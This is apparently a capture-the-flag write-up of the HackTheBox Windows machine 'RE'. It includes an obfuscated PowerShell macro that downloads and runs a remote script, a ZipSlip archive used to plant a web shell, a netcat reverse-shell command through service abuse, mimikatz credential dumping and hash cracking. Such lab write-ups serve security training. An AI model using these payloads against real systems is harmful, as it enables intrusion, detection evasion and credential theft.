# RE - HackTheBox
## Windows - Hard

### User
We add `re.htb` and `reblog.htb` to `/etc/hosts`. On `reblog.htb`, we see blog post saying that someone will look at `ods` files on a Dropbox and run them. It is also explained how to detect malicious `ods` files. On `smb`, there is a share `malware_dropbox`. The path is clear: create a malicious `ods` file undetectable with the methods explained in the blog post, put it in the `malware_dropbox` share, and wait for someone to run it. 

To create the `ods` file, we start simple by pinging ourselves: 
```
Shell(&quot;ping.exe 10.10.14.175&quot;)
```
which works. Then, we try PowerShell commands to get a reverse shell, but they do not work, since they probably don't pass the tests. Looking around for obfuscation techniques, we see that words in a PowerShell commands can have `^` that count as empty in the command. Our payload is then:
```
Shell(&quot;cmd.exe /C &quot;&quot; powershell.exe i^ex(New-Obj^ect Net.Web^Client).download^string('http://10.10.14.175/shell.ps1')&quot;&quot;&quot;)
```
which gives us a shell as `luke`, along with `root.txt`.

(Note: The easiest way to upload a file on the `malware_dropbox` share is through `nautilus`, where we connect with user `root`, password `whatever`. It didn't work well with `smbmap` or `smbclient`.

### Root
In `C:\Users\luke\Documents\process_samples.ps1` is explained how the `ods` processing is done. In a comment in this file, it is written that an *upstream process* may expect `rar` archives in `C:\Users\luke\documents\ods\`. We try to put a malicious `rar` in there. We can see that the `rar` extraction is vulnerable to ZipSlip, by putting the archive from `python evilarc.py -p "users\public\" test_file; mv evil.zip evil.rar` in the `ods` folder, and seeing `test_file` in `c:\users\public` 10 seconds later. This file will be owned by `cam` who has write access to the IIS folder `C:\inetpub`.

We thus put a `aspx` reverse shell in `C:\inetpub\wwwroot\blog\` and get a shell as user `IIS`. 

We run `PowerUp.ps1` as user `iis` and see the following:
```
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```
We thus run `Invoke-ServiceAbuse -Name 'UsoSvc' -Command C:\users\public\nc.exe 10.10.14.175 9001 -e cmd.exe` and get a shell as `NT Authority \ System`. We type `root.txt` but get `Permission Denied` since the file is encrypter.

We uplaod `mimikatz.exe` on the box and run: `mimikatz # sekurlsa::logonpasswords` to get the NTLM hash of user `coby` (who can read `root.txt`). We crack this has with `hashcat -m 1000 coby-hash /usr/share/wordlists/rockyou.txt` and find his password `championship2005`.

Then, we follow this [tutorial](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) for user `coby`, after which we can finally type `root.txt`!

